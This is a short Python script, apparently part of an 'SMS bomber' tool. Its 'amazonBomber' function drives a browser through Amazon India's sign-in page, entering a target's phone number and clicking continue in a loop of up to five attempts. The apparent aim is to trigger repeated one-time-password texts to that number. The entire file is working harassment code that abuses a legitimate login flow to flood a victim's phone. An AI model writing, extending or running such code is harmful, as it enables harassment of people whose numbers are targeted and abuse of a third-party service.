import time

# Amazon Bomber
def amazonBomber(browser, phoneNumber, attempts=5):
    for i in range(min(attempts, 5)):
        try:
            browser.get(
                "https://www.amazon.in/ap/signin?ie=UTF8&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.mode=checkid_setup&_encoding=UTF8&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&switch_account=signin&ignoreAuthState=1&disableLoginPrepopulate=1&ref_=ap_sw_aa"
            )

            # Waiting for the page to load
            time.sleep(2)

            # Selecting the input field
            inPut = browser.find_element_by_id("ap_email")
            inPut.send_keys(phoneNumber)

            # Clicking the submit button
            cLick = browser.find_element_by_xpath(
                "//input[@type='submit' and @id='continue']"
            )
            cLick.click()

            # Waiting for the next page to load
            time.sleep(2)

            # Selecting & clicking the submit button
            cLick1 = browser.find_element_by_xpath(
                "//input[@type='submit' and @id='continue']"
            )
            cLick1.click()

        except:
            print("Something went wrong in Amazon Bomber")

        finally:
            # Waiting so that one request completes
            time.sleep(5)